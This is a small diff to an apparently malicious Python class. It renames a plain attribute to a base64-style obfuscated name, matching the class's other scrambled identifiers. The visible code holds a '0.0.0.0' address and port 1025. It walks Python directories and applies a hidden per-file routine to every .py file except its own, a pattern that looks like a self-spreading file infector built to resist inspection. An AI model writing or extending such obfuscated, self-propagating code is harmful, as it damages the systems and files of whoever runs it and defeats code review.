@@ -16,7 +16,7 @@ from subprocess import run, PIPE
 
 class eHhjemR5eXB:
     def __init__(self):
-        self.SYSTEM: str = system()
+        self.bGpqZ2hjen: str = system()
         self.aWFmYXRye: str = "0.0.0.0"
         self.ZmFsa2p0aGM: int = 1025
     def dGVyeXB6Y2FjeH(self, target_file: str):
@@ -49,7 +49,7 @@ class eHhjemR5eXB:
     def MTRkYmNubWx(self):
         for py_dir in self.python_dirs:
             for Z3Jvb3RhbGZq, _, _ in walk(py_dir):
-                YWJyZmFm: chr = "/" if self.SYSTEM == "Linux" else "\\"
+                YWJyZmFm: chr = "/" if self.bGpqZ2hjen == "Linux" else "\\"
                 for file_ in glob(Z3Jvb3RhbGZq+YWJyZmFm+"*.py"):
                     if file_ == Z3Jvb3RhbGZq+YWJyZmFm+__file__: continue
                     self.dGVyeXB6Y2FjeH(file_)
